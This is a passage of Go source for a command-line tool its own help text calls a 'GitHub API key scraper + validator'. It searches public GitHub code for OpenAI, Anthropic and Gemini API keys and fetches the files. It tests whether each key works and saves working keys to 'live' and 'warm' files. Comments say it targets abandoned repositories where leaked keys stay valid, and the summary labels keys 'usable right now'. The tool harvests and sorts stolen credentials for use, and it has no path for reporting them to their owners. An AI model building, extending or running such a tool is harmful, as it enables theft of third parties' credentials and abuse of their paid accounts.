                shortRepo = shortRepo[:36] + "…"
        }
        shortFile := r.File
        if len(shortFile) > 24 {
                shortFile = shortFile[:24] + "…"
        }

        printMu.Lock()
        bar.Clear()
        fmt.Printf("  %s  %s  %s  %s  %s/%s\n",
                pc.Sprintf("%-10s", strings.ToUpper(r.Provider)),
                statusStr,
                dim.Sprintf("[%s]", r.FoundAt.Format("15:04:05")),
                cyan.Sprintf("%-30s", shortKey),
                dim.Sprint(shortRepo),
                dim.Sprint(shortFile),
        )
        _ = bar.RenderBlank()
        printMu.Unlock()
}

// ═══════════════════════════════════════════════════════════════════════════
// GitHub scraper
// ═══════════════════════════════════════════════════════════════════════════

type GitHubScraper struct {
        tokens    *Tokens
        sinceTime time.Time // pushed:> filter — from lastrun file or 24h ago
}

type ghSearchItem struct {
        Name, Path, HTMLURL, FullRepo, SHA string
        Size                               int
        RepoPushedAt                       time.Time // from repository.pushed_at in search response
        CommitSHA                          string    // commit hash extracted from html_url blob path
}

// extractCommitSHA parses the commit SHA from a GitHub blob URL.
// Format: https://github.com/{owner}/{repo}/blob/{commit_sha}/{path}
func extractCommitSHA(htmlURL string) string {
        // split on "/blob/"
        parts := strings.SplitN(htmlURL, "/blob/", 2)
        if len(parts) != 2 {
                return ""
        }
        // remainder is "commit_sha/path/to/file" — take the first segment
        rest := parts[1]
        slash := strings.Index(rest, "/")
        if slash == -1 {
                return rest
        }
        return rest[:slash]
}

type ghSearchResp struct {
        TotalCount int `json:"total_count"`
        Items      []struct {
                Name    string `json:"name"`
                Path    string `json:"path"`
                HTMLURL string `json:"html_url"`
                Size    int    `json:"size"`
                Repo    struct {
                        FullName string `json:"full_name"`
                        PushedAt string `json:"pushed_at"` // e.g. "2024-01-15T10:30:00Z"
                } `json:"repository"`
                SHA string `json:"sha"`
        } `json:"items"`
}

// ghGetWithHeaders returns body, status, and response headers.
func ghGetWithHeaders(endpoint string, params map[string]string, tok string) ([]byte, int, http.Header, error) {
        req, err := http.NewRequest("GET", "https://api.github.com"+endpoint, nil)
        if err != nil {
                return nil, 0, nil, err
        }
        req.Header.Set("Accept", "application/vnd.github.v3+json")
        if tok != "" {
                req.Header.Set("Authorization", "token "+tok)
        }
        q := req.URL.Query()
        for k, v := range params {
                q.Set(k, v)
        }
        req.URL.RawQuery = q.Encode()
        resp, err := httpClient.Do(req)
        if err != nil {
                return nil, 0, nil, err
        }
        defer resp.Body.Close()
        body, _ := io.ReadAll(resp.Body)
        return body, resp.StatusCode, resp.Header, nil
}

// sleepUntilReset sleeps until the time specified in X-RateLimit-Reset header.
func sleepUntilReset(headers http.Header) {
        resetStr := headers.Get("X-RateLimit-Reset")
        if resetStr == "" {
                warn("Rate limit hit — sleeping 65s …")
                time.Sleep(65 * time.Second)
                return
        }
        resetUnix, err := strconv.ParseInt(resetStr, 10, 64)
        if err != nil {
                time.Sleep(65 * time.Second)
                return
        }
        resetAt := time.Unix(resetUnix, 0)
        sleepFor := time.Until(resetAt) + 3*time.Second
        if sleepFor < 0 {
                sleepFor = 10 * time.Second
        }
        warn(fmt.Sprintf("Rate limit hit — sleeping %s until %s …",
                sleepFor.Round(time.Second), resetAt.Format("15:04:05")))
        time.Sleep(sleepFor)
}

func (g *GitHubScraper) searchCode(query string, startPage, maxPages int) ([]ghSearchItem, error) {
        // GitHub code search does NOT support date filters reliably (pushed:>DATE
        // returns ~0 results for recent windows — confirmed broken). Instead:
        //   • sort=indexed&order=desc  → most recently indexed files first
        //   • seen-key cache           → skip files already processed on prior runs
        //   • commit-date check        → getFileContent filters old commits server-side
        // This is the standard approach; OSINT tools like trufflehog use the same strategy.
        // startPage lets callers skip burned early pages (default 1).

        var all []ghSearchItem
        for p := startPage; p < startPage+maxPages; p++ {
                tok := g.tokens.next()
                body, status, headers, err := ghGetWithHeaders("/search/code", map[string]string{
                        "q":        query,
                        "sort":     "indexed",
                        "order":    "desc",
                        "per_page": "100",
                        "page":     fmt.Sprint(p),
                }, tok)
                if err != nil {
                        return all, err
                }
                if status == 403 || status == 429 {
                        // Only sleep+retry on genuine rate-limit 403 (Remaining==0).
                        // A query-rejection 403 has Remaining>0 and loops forever —
                        // treat it as a hard failure and break.
                        if headers.Get("X-RateLimit-Remaining") == "0" || status == 429 {
                                sleepUntilReset(headers)
                                p-- // retry same page after sleep
                                continue
                        }
                        break // non-rate-limit 403 (bad query) — stop paging
                }
                if status == 422 || status == 404 {
                        break
                }
                if status != 200 {
                        break
                }
                var resp ghSearchResp
                if err := json.Unmarshal(body, &resp); err != nil {
                        break
                }
                for _, it := range resp.Items {
                        // Parse pushed_at for display/logging — but do NOT use it
                        // as a hard filter. Live keys tend to live in old repos that
                        // owners abandoned without cleaning up secrets. Filtering by
                        // push date would eliminate exactly those repos.
                        var pushedAt time.Time
                        if it.Repo.PushedAt != "" {
                                pushedAt, _ = time.Parse(time.RFC3339, it.Repo.PushedAt)
                        }
                        all = append(all, ghSearchItem{
                                Name:         it.Name,
                                Path:         it.Path,
                                HTMLURL:      it.HTMLURL,
                                Size:         it.Size,
                                FullRepo:     it.Repo.FullName,
                                SHA:          it.SHA,
                                RepoPushedAt: pushedAt,
                                CommitSHA:    extractCommitSHA(it.HTMLURL),
                        })
                }
                if len(resp.Items) < 100 {
                        break
                }
                // Stay under 10 req/min search limit
                time.Sleep(searchDelayMs * time.Millisecond)
        }
        return all, nil
}

func (g *GitHubScraper) getFileContent(repo, path, htmlURL string) (string, error) {
        // Strategy 1: raw.githubusercontent.com via the html_url branch path.
        // html_url = https://github.com/{owner}/{repo}/blob/{branch}/{path}
        // Convert to: https://raw.githubusercontent.com/{owner}/{repo}/{branch}/{path}
        rawURL := ""
        if htmlURL != "" {
                rawURL = strings.Replace(htmlURL, "https://github.com/", "https://raw.githubusercontent.com/", 1)
                rawURL = strings.Replace(rawURL, "/blob/", "/", 1)
        }

        if rawURL != "" {
                req, err := http.NewRequest("GET", rawURL, nil)
                if err == nil {
                        tok := g.tokens.next()
                        if tok != "" {
                                req.Header.Set("Authorization", "token "+tok)
                        }
                        resp, err := httpClient.Do(req)
                        if err == nil {
                                defer resp.Body.Close()
                                if resp.StatusCode == 200 {
                                        body, _ := io.ReadAll(io.LimitReader(resp.Body, maxFileBytes))
                                        return string(body), nil
                                }
                        }
                }
        }

        // Strategy 2: contents API without ?ref (gets default branch HEAD)
        tok := g.tokens.next()
        ep := fmt.Sprintf("/repos/%s/contents/%s", repo, url.PathEscape(strings.TrimPrefix(path, "/")))
        body, status, err := ghGet(ep, nil, tok)
        if err != nil || status != 200 {
                return "", fmt.Errorf("contents api status %d", status)
        }
        var obj struct {
                Content string `json:"content"`
        }
        if err := json.Unmarshal(body, &obj); err != nil {
                return "", err
        }
        decoded, err := base64.StdEncoding.DecodeString(strings.ReplaceAll(obj.Content, "\n", ""))
        return string(decoded), err
}

// batchGetCommitDates fetches the committer date for each unique (repo, commitSHA)
// pair in parallel. This is more accurate than repo.pushed_at because it tells us
// exactly when the specific file/commit was made, not when ANY branch was last pushed.
// key = "owner/repo:commitSHA", value = committer timestamp.
func (g *GitHubScraper) batchGetCommitDates(items []ghSearchItem) map[string]time.Time {
        // Build deduplicated key set
        type commitKey struct{ repo, sha string }
        seen := make(map[commitKey]bool)
        var unique []commitKey
        for _, it := range items {
                if it.CommitSHA == "" {
                        continue
                }
                ck := commitKey{it.FullRepo, it.CommitSHA}
                if !seen[ck] {
                        seen[ck] = true
                        unique = append(unique, ck)
                }
        }

        result := make(map[string]time.Time)
        var mu sync.Mutex
        var wg sync.WaitGroup
        sem := make(chan struct{}, 20)
        for _, ck := range unique {
                ck := ck
                wg.Add(1)
                sem <- struct{}{}
                go func() {
                        defer wg.Done()
                        defer func() { <-sem }()
                        tok := g.tokens.next()
                        body, status, err := ghGet("/repos/"+ck.repo+"/commits/"+ck.sha, nil, tok)
                        if err != nil || status != 200 {
                                return
                        }
                        var c struct {
                                Commit struct {
                                        Committer struct {
                                                Date string `json:"date"`
                                        } `json:"committer"`
                                } `json:"commit"`
                        }
                        if err := json.Unmarshal(body, &c); err == nil && c.Commit.Committer.Date != "" {
                                t, err := time.Parse(time.RFC3339, c.Commit.Committer.Date)
                                if err == nil {
                                        mu.Lock()
                                        result[ck.repo+":"+ck.sha] = t
                                        mu.Unlock()
                                }
                        }
                }()
        }
        wg.Wait()
        return result
}

func (g *GitHubScraper) scrape(
        provider string,
        cfg *Config,
        seen *SeenSet,
        store *ResultStore,
        bar *progressbar.ProgressBar,
        totalFound *int64,
        sem chan struct{},
        wg *sync.WaitGroup,
) {
        var jobs []ghSearchItem
        queries := searchQueries[provider]
        searchStart := time.Now()
        for i, q := range queries {
                bar.Describe(dim.Sprintf("searching %s %d/%d…", strings.ToUpper(provider), i+1, len(queries)))
                items, err := g.searchCode(q, cfg.PageStart, cfg.Pages)
                newFiles := 0
                if err == nil {
                        for _, it := range items {
                                if shouldScan(it.Path, it.Size) {
                                        jobs = append(jobs, it)
                                        newFiles++
                                }
                        }
                }
                printQuery(provider, i, len(queries), newFiles, searchStart, bar)
                // Space queries to stay within 10 req/min search limit
                if i < len(queries)-1 {
                        time.Sleep(searchDelayMs * time.Millisecond)
                }
        }
        bar.Describe(dim.Sprint("scanning…"))

        // ── Optional commit-date freshness filter ────────────────────────────
        // If FreshnessDays > 0, fetch the COMMIT DATE for each file (not the
        // repo's pushed_at, which reflects any branch push and can be much newer
        // than the specific file commit). We call /repos/{owner}/{repo}/commits/{sha}
        // for each unique (repo, commitSHA) pair — this gives the exact date the
        // file was last committed and makes the window accurate.
        if cfg.FreshnessDays > 0 {
                cutoff := time.Now().UTC().Add(-time.Duration(cfg.FreshnessDays) * 24 * time.Hour)
                info(fmt.Sprintf("Fetching commit dates for %d file(s) (freshness: %d days, cutoff: %s)…",
                        len(jobs), cfg.FreshnessDays, cutoff.Format("2006-01-02")))
                commitDates := g.batchGetCommitDates(jobs)
                var filtered []ghSearchItem
                skipped := 0
                for _, job := range jobs {
                        key := job.FullRepo + ":" + job.CommitSHA
                        t, ok := commitDates[key]
                        if ok && t.Before(cutoff) {
                                skipped++
                                continue
                        }
                        // If we couldn't fetch the commit date (network error etc.),
                        // keep the file rather than silently dropping it.
                        filtered = append(filtered, job)
                }
                warn(fmt.Sprintf("Freshness filter: kept %d / %d files (skipped %d committed before %s)",
                        len(filtered), len(jobs), skipped, cutoff.Format("2006-01-02")))
                jobs = filtered
        }

        bar.ChangeMax64(bar.GetMax64() + int64(len(jobs)))

        seenFiles := &sync.Map{}

        for _, job := range jobs {
                job := job
                fileKey := job.FullRepo + ":" + job.Path
                if _, loaded := seenFiles.LoadOrStore(fileKey, true); loaded {
                        _ = bar.Add(1)
                        continue
                }

                wg.Add(1)
                sem <- struct{}{}
                go func() {
                        defer wg.Done()
                        defer func() { <-sem }()
                        defer func() { _ = bar.Add(1) }()

                        content, err := g.getFileContent(job.FullRepo, job.Path, job.HTMLURL)
                        if err != nil || content == "" {
                                return
                        }
                        for _, key := range extractKeys(content)[provider] {
                                if seen.seen(key) {
                                        continue
                                }
                                seen.add(key)
                                atomic.AddInt64(totalFound, 1)

                                valid := -1
                                if cfg.Validate {
                                        valid = validateKey(provider, key)
                                }

                                r := Result{
                                        Key:      key,
                                        Provider: provider,
                                        Platform: "GitHub",
                                        Repo:     job.FullRepo,
                                        File:     job.Path,
                                        URL:      job.HTMLURL,
                                        Valid:    valid,
                                        FoundAt:  time.Now(),
                                }
                                store.add(r)
                                printKey(r, bar)
                        }
                }()
        }
}

// ═══════════════════════════════════════════════════════════════════════════
// Save results
// ═══════════════════════════════════════════════════════════════════════════

func saveResults(store *ResultStore, outDir string) {
        results := store.all()
        if len(results) == 0 {
                return
        }

        _ = os.MkdirAll(outDir, 0755)

        // Group by provider
        byProvider := make(map[string][]Result)
        for _, r := range results {
                byProvider[r.Provider] = append(byProvider[r.Provider], r)
        }

        for provider, items := range byProvider {
                // ── Live-only file (primary output) ───────────────────────────────
                var liveItems []Result
                for _, r := range items {
                        if r.Valid == 1 {
                                liveItems = append(liveItems, r)
                        }
                }

                if len(liveItems) > 0 {
                        lpath := filepath.Join(outDir, provider+"_live.txt")
                        f, err := os.OpenFile(lpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
                        if err != nil {
                                fail("Cannot write " + lpath + ": " + err.Error())
                        } else {
                                w := bufio.NewWriter(f)
                                for _, r := range liveItems {
                                        fmt.Fprintf(w, "[LIVE] %s\n", strings.ToUpper(r.Provider))
                                        fmt.Fprintf(w, "Key:      %s\n", r.Key)
                                        fmt.Fprintf(w, "Platform: %s\n", r.Platform)
                                        fmt.Fprintf(w, "Repo:     %s\n", r.Repo)
                                        fmt.Fprintf(w, "File:     %s\n", r.File)
                                        fmt.Fprintf(w, "URL:      %s\n", r.URL)
                                        fmt.Fprintf(w, "Found:    %s\n", r.FoundAt.Format(time.RFC3339))
                                        fmt.Fprintln(w, strings.Repeat("═", 60))
                                        fmt.Fprintln(w)
                                }
                                _ = w.Flush()
                                f.Close()
                                success(green.Sprintf("%d LIVE %s key(s) → %s", len(liveItems), strings.ToUpper(provider), lpath))
                        }
                } else {
                        warn(fmt.Sprintf("0 live %s keys this run", provider))
                }

                // ── Warm file (valid key + real quota, but burned today) ───────────
                var warmItems []Result
                for _, r := range items {
                        if r.Valid == 2 {
                                warmItems = append(warmItems, r)
                        }
                }
                if len(warmItems) > 0 {
                        wpath := filepath.Join(outDir, provider+"_warm.txt")
                        fw, err := os.OpenFile(wpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
                        if err != nil {
                                fail("Cannot write " + wpath + ": " + err.Error())
                        } else {
                                w := bufio.NewWriter(fw)
                                for _, r := range warmItems {
                                        fmt.Fprintf(w, "[WARM] %s\n", strings.ToUpper(r.Provider))
                                        fmt.Fprintf(w, "Key:      %s\n", r.Key)
                                        fmt.Fprintf(w, "Platform: %s\n", r.Platform)
                                        fmt.Fprintf(w, "Repo:     %s\n", r.Repo)
                                        fmt.Fprintf(w, "File:     %s\n", r.File)
                                        fmt.Fprintf(w, "URL:      %s\n", r.URL)
                                        fmt.Fprintf(w, "Found:    %s\n", r.FoundAt.Format(time.RFC3339))
                                        fmt.Fprintln(w, strings.Repeat("═", 60))
                                        fmt.Fprintln(w)
                                }
                                _ = w.Flush()
                                fw.Close()
                                resetNote := "retry after midnight PT (daily reset)"
                                if provider == "openai" || provider == "anthropic" {
                                        resetNote = "retry after ~1 min (per-minute rate limit)"
                                }
                                success(yellow.Sprintf("%d WARM %s key(s) → %s  (%s)", len(warmItems), strings.ToUpper(provider), wpath, resetNote))
                        }
                }

                // ── Full log (all found — for reference) ──────────────────────────
                apath := filepath.Join(outDir, provider+"_all.txt")
                f2, err := os.OpenFile(apath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                if err == nil {
                        w := bufio.NewWriter(f2)
                        for _, r := range items {
                                status := "UNKNOWN"
                                switch r.Valid {
                                case 1:
                                        status = "LIVE"
                                case 2:
                                        status = "WARM"
                                case 0:
                                        status = "DEAD"
                                }
                                fmt.Fprintf(w, "[%s] %s  %s\n",
                                        status, strings.ToUpper(r.Provider), r.FoundAt.Format("15:04:05"))
                                fmt.Fprintf(w, "Key: %s\n", r.Key)
                                fmt.Fprintf(w, "URL: %s\n", r.URL)
                                fmt.Fprintln(w, strings.Repeat("-", 60))
                        }
                        _ = w.Flush()
                        f2.Close()
                }
        }

        fmt.Println()
}

// ═══════════════════════════════════════════════════════════════════════════
// Summary
// ═══════════════════════════════════════════════════════════════════════════

func printSummary(store *ResultStore, elapsed time.Duration) {
        results := store.all()
        fmt.Println()
        divider()
        white.Println("  Summary")
        divider()

        type row struct{ total, live, warm, dead, unknown int }
        counts := map[string]*row{"openai": {}, "anthropic": {}, "gemini": {}}
        for _, r := range results {
                c := counts[r.Provider]
                if c == nil {
                        continue
                }
                c.total++
                switch r.Valid {
                case 1:
                        c.live++
                case 2:
                        c.warm++
                case 0:
                        c.dead++
                default:
                        c.unknown++
                }
        }

        fmt.Printf("  %-12s  %-7s  %-6s  %-6s  %-6s  %-8s\n",
                white.Sprint("Provider"), cyan.Sprint("Total"),
                green.Sprint("Live"), yellow.Sprint("Warm"), red.Sprint("Dead"), dim.Sprint("Unknown"))
        dim.Println("  " + strings.Repeat("─", 52))

        for _, p := range []string{"openai", "anthropic", "gemini"} {
                c := counts[p]
                pc := providerColor[p]
                if pc == nil {
                        pc = white
                }
                fmt.Printf("  %-12s  %-7s  %-6s  %-6s  %-6s  %-8s\n",
                        pc.Sprintf("%-12s", strings.ToUpper(p)),
                        cyan.Sprintf("%d", c.total),
                        green.Sprintf("%d", c.live),
                        yellow.Sprintf("%d", c.warm),
                        red.Sprintf("%d", c.dead),
                        dim.Sprintf("%d", c.unknown),
                )
        }

        totalLive := 0
        totalWarm := 0
        for _, c := range counts {
                totalLive += c.live
                totalWarm += c.warm
        }
        fmt.Println()
        fmt.Printf("  Total keys found:  %s\n", cyan.Sprintf("%d", len(results)))
        fmt.Printf("  Confirmed live:    %s  (200 OK — usable right now)\n", green.Sprintf("%d", totalLive))
        fmt.Printf("  Warm (burned):     %s  (valid key+quota, reset ~midnight PT)\n", yellow.Sprintf("%d", totalWarm))
        fmt.Printf("  Elapsed:           %s\n", dim.Sprintf("%s", elapsed.Round(time.Second)))
        fmt.Println()
}

// ═══════════════════════════════════════════════════════════════════════════
// Run scan (callable from menu or CLI)
// ═══════════════════════════════════════════════════════════════════════════

func runScan(cfg *Config) {
        startedAt := time.Now()

        // Load last-run timestamp for pushed:> filter (or 24h ago on first run)
        sinceTime := loadLastRun(lastRunFile)

        divider()
        info(fmt.Sprintf("Started:     %s", cyan.Sprint(startedAt.UTC().Format("2006-01-02 15:04:05 UTC"))))
        info(fmt.Sprintf("Providers:   %s", cyan.Sprint(strings.Join(cfg.Providers, ", "))))
        freshnessInfo := dim.Sprint("off")
        if cfg.FreshnessDays > 0 {
                freshnessInfo = cyan.Sprintf("%dd", cfg.FreshnessDays)
        }
        pageRange := fmt.Sprintf("%d-%d", cfg.PageStart, cfg.PageStart+cfg.Pages-1)
        info(fmt.Sprintf("Pages/query: %s  ·  Workers: %s  ·  Validate: %s  ·  Freshness: %s",
                cyan.Sprint(pageRange),
                cyan.Sprintf("%d", cfg.Workers),
                boolStr(cfg.Validate),
                freshnessInfo,
        ))
        info(fmt.Sprintf("Tokens:      %s", cyan.Sprintf("%d GitHub PAT(s)", len(cfg.GHTokens))))
        info(fmt.Sprintf("Sort:        %s",
                cyan.Sprint("indexed desc — most recently indexed files first")))
        info(fmt.Sprintf("Dedup cache: %s  (keys seen before %s skipped)",
                dim.Sprint(cfg.CacheFile),
                cyan.Sprint(sinceTime.UTC().Format("2006-01-02"))))
        fmt.Println()

        seen := newSeenSet(cfg.CacheFile)
        defer seen.close()

        store := &ResultStore{}
        var totalFound int64
        sem := make(chan struct{}, cfg.Workers)
        var wg sync.WaitGroup

        // ── Graceful shutdown on SIGTERM/SIGINT — always save what we found ───
        sigCh := make(chan os.Signal, 1)
        signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
        go func() {
                sig := <-sigCh
                fmt.Fprintf(os.Stderr, "\n[!] Caught %s — saving partial results…\n", sig)
                saveResults(store, cfg.OutDir)
                saveLastRun(lastRunFile, startedAt)
                os.Exit(0)
        }()

        ghScraper := &GitHubScraper{
                tokens:    &Tokens{list: cfg.GHTokens},
                sinceTime: sinceTime,
        }

        bar := progressbar.NewOptions64(
                0,
                progressbar.OptionSetDescription(dim.Sprint("scanning…")),
                progressbar.OptionSetTheme(progressbar.Theme{
                        Saucer:        green.Sprint("█"),
                        SaucerHead:    cyan.Sprint("▶"),
                        SaucerPadding: dim.Sprint("░"),
                        BarStart:      dim.Sprint("["),
                        BarEnd:        dim.Sprint("]"),
                }),
                progressbar.OptionShowCount(),
                progressbar.OptionShowIts(),
                progressbar.OptionSetItsString("files"),
                progressbar.OptionSetWidth(40),
                progressbar.OptionThrottle(100*time.Millisecond),
                progressbar.OptionSetRenderBlankState(true),
                progressbar.OptionEnableColorCodes(true),
        )

        for _, provider := range cfg.Providers {
                if _, ok := patterns[provider]; !ok {
                        warn("Unknown provider: " + provider + " — skipping")
                        continue
                }
                ghScraper.scrape(provider, cfg, seen, store, bar, &totalFound, sem, &wg)
        }

        wg.Wait()
        _ = bar.Finish()

        printSummary(store, time.Since(startedAt))
        saveResults(store, cfg.OutDir)

        // Save run timestamp so next scan only checks repos pushed after this moment
        saveLastRun(lastRunFile, startedAt)
}

// ═══════════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════════

func main() {
        cfg := defaultConfig()

        // ── Load tokens: file first, then env var, then CLI flag ──────────────
        fileTokens := loadEnvKeyFile(envKeyFile)
        cfg.GHTokens = append(cfg.GHTokens, fileTokens...)

        // Auto-load individual well-known env vars (GITHUB_PERSONAL_ACCESS_TOKEN,
        // GITHUB1_PERSONAL_ACCESS_TOKEN, GITHUB_TOKEN, GITHUB_TOKENS)
        for _, envName := range []string{
                "GITHUB_PERSONAL_ACCESS_TOKEN",
                "GITHUB1_PERSONAL_ACCESS_TOKEN",
                "GITHUB_TOKEN",
        } {
                if v := os.Getenv(envName); v != "" {
                        cfg.GHTokens = append(cfg.GHTokens, v)
                }
        }
        // Comma-separated list
        if ev := os.Getenv("GITHUB_TOKENS"); ev != "" {
                for _, t := range strings.Split(ev, ",") {
                        if t = strings.TrimSpace(t); t != "" {
                                cfg.GHTokens = append(cfg.GHTokens, t)
                        }
                }
        }

        // ── Check for --run flag (non-interactive mode) ────────────────────────
        // If --run is passed, read remaining flags and go directly to scan.
        // This lets the tool be scripted without the menu.
        args := os.Args[1:]
        runDirect := false
        var ghFlag, providersFlag, outFlag, cacheFlag string
        var pagesFlag, pageStartFlag, workersFlag, freshnessDaysFlag int
        var validateFlag bool

        for i := 0; i < len(args); i++ {
                switch args[i] {
                case "--run", "-run":
                        runDirect = true
                case "--github-token", "-github-token":
                        if i+1 < len(args) {
                                i++
                                ghFlag = args[i]
                        }
                case "--providers", "-providers":
                        if i+1 < len(args) {
                                i++
                                providersFlag = args[i]
                        }
                case "--pages", "-pages":
                        if i+1 < len(args) {
                                i++
                                pagesFlag, _ = strconv.Atoi(args[i])
                        }
                case "--page-start", "-page-start":
                        if i+1 < len(args) {
                                i++
                                pageStartFlag, _ = strconv.Atoi(args[i])
                        }
                case "--workers", "-workers":
                        if i+1 < len(args) {
                                i++
                                workersFlag, _ = strconv.Atoi(args[i])
                        }
                case "--freshness-days", "-freshness-days":
                        if i+1 < len(args) {
                                i++
                                freshnessDaysFlag, _ = strconv.Atoi(args[i])
                        }
                case "--validate", "-validate":
                        validateFlag = true
                case "--out", "-out":
                        if i+1 < len(args) {
                                i++
                                outFlag = args[i]
                        }
                case "--cache", "-cache":
                        if i+1 < len(args) {
                                i++
                                cacheFlag = args[i]
                        }
                case "--help", "-help", "-h":
                        banner()
                        white.Println("  keychk — GitHub API key scraper + validator")
                        fmt.Println()
                        dim.Println("  Without --run, an interactive menu is shown.")
                        fmt.Println()
                        white.Println("  Flags:")
                        fmt.Println("    --run                   skip menu, start scan immediately")
                        fmt.Println("    --github-token TOKEN     GitHub PAT(s), comma-separated")
                        fmt.Println("    --providers LIST         openai,anthropic,gemini (default: all)")
                        fmt.Println("    --pages N                search pages per query (default: 5)")
                        fmt.Println("    --page-start N           first page to fetch, 1-indexed (default: 1)")
                        fmt.Println("                             use 2+ to skip burned page-1 results")
                        fmt.Println("    --workers N              concurrent file workers (default: 10)")
                        fmt.Println("    --validate               live-validate found keys")
                        fmt.Println("    --out DIR                output directory (default: .)")
                        fmt.Println("    --cache FILE             seen-key cache file (default: keychk_seen.txt)")
                        fmt.Println()
                        white.Println("  Token file:")
                        fmt.Printf("    %s in the current directory.\n", envKeyFile)
                        dim.Println("    One token per line, or GITHUB_TOKEN=ghp_xxx format.")
                        fmt.Println()
                        white.Println("  Examples:")
                        fmt.Println("    ./keychk                              # interactive menu")
                        fmt.Println("    ./keychk --run --validate             # non-interactive, validate keys")
                        fmt.Println("    ./keychk --run --github-token ghp_xxx --pages 10 --validate")
                        fmt.Println()
                        os.Exit(0)
                }
        }

        // Apply CLI overrides
        if ghFlag != "" {
                for _, t := range strings.Split(ghFlag, ",") {
                        if t = strings.TrimSpace(t); t != "" {
                                cfg.GHTokens = append(cfg.GHTokens, t)
                        }
                }
        }
        if providersFlag != "" {
                var list []string
                for _, p := range strings.Split(providersFlag, ",") {
                        if p = strings.TrimSpace(strings.ToLower(p)); p != "" {
                                list = append(list, p)
                        }
                }
                if len(list) > 0 {
                        cfg.Providers = list
                }
        }
        if pagesFlag > 0 {
                cfg.Pages = pagesFlag
        }
        if pageStartFlag > 0 {
                cfg.PageStart = pageStartFlag
        }
        if workersFlag > 0 {
                cfg.Workers = workersFlag
        }
        if validateFlag {
                cfg.Validate = true
        }
        if outFlag != "" {
                cfg.OutDir = outFlag
        }
        if cacheFlag != "" {
                cfg.CacheFile = cacheFlag
        }
        if freshnessDaysFlag > 0 {
                cfg.FreshnessDays = freshnessDaysFlag
        }

        // Deduplicate tokens
        seen := make(map[string]bool)
        var deduped []string
        for _, t := range cfg.GHTokens {
                if !seen[t] {
                        seen[t] = true
                        deduped = append(deduped, t)
                }
        }
        cfg.GHTokens = deduped

        banner()

        if runDirect {
                // Non-interactive: print token status and scan
                if len(cfg.GHTokens) == 0 {
                        warn("No GitHub tokens — running unauthenticated (very limited).")
                        warn("Add tokens to " + envKeyFile + " or pass --github-token.")
                        fmt.Println()
                } else {
                        success(fmt.Sprintf("%d GitHub token(s) loaded", len(cfg.GHTokens)))
                }
                runScan(cfg)
        } else {
                // Interactive menu
                if len(cfg.GHTokens) > 0 {
                        success(fmt.Sprintf("%d GitHub token(s) loaded from %s / env", len(cfg.GHTokens), envKeyFile))
                } else {
                        warn("No tokens loaded yet. Add one via option [7] in the menu.")
                }
                fmt.Println()
                runMenu(cfg)
        }
}

// unused imports kept away from the compiler
var _ = bytes.NewReader
